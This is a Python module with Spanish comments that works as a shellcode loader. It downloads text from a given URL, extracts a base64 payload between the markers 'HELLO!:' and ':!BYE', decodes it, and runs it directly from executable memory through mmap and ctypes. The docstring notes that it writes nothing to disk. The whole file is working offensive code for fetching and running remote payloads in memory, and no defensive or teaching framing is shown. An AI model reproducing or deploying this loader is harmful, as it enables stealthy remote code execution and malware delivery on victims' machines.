import re
import base64
import ctypes
import mmap
import requests

PAYLOAD_START = "HELLO!:"
PAYLOAD_END   = ":!BYE"


def _download_content(url: str) -> str | None:
    """Descarga el contenido HTML/texto de la URL del payload."""
    try:
        resp = requests.get(url, timeout=10)
        resp.raise_for_status()
        return resp.text
    except Exception:
        return None


def _extract_b64(content: str) -> str | None:
    """Extrae el payload en base64 entre los delimitadores mágicos."""
    pattern = re.escape(PAYLOAD_START) + r"(.*?)" + re.escape(PAYLOAD_END)
    match = re.search(pattern, content, re.DOTALL)
    if match:
        return match.group(1).strip()
    return None


def _decode_shellcode(b64_data: str) -> bytes | None:
    """Decodifica base64 → bytes del shellcode."""
    try:
        return base64.b64decode(b64_data)
    except Exception:
        return None


def _execute_shellcode(shellcode: bytes) -> None:
    """
    Aloja el shellcode en memoria RWX con mmap y lo ejecuta vía ctypes.
    No escribe nada en disco.
    """
    size = len(shellcode)
    mem = mmap.mmap(
        -1, size,
        prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC
    )
    mem.write(shellcode)
    mem.seek(0)

    buf      = (ctypes.c_char * size).from_buffer(mem)
    func_ptr = ctypes.cast(ctypes.addressof(buf), ctypes.CFUNCTYPE(None))
    func_ptr()


def fetch_and_execute(url: str) -> bool:
    """Punto de entrada del módulo: descarga → extrae → decodifica → ejecuta."""
    content = _download_content(url)
    if not content:
        return False

    b64_data = _extract_b64(content)
    if not b64_data:
        return False

    shellcode = _decode_shellcode(b64_data)
    if not shellcode:
        return False

    _execute_shellcode(shellcode)
    return True
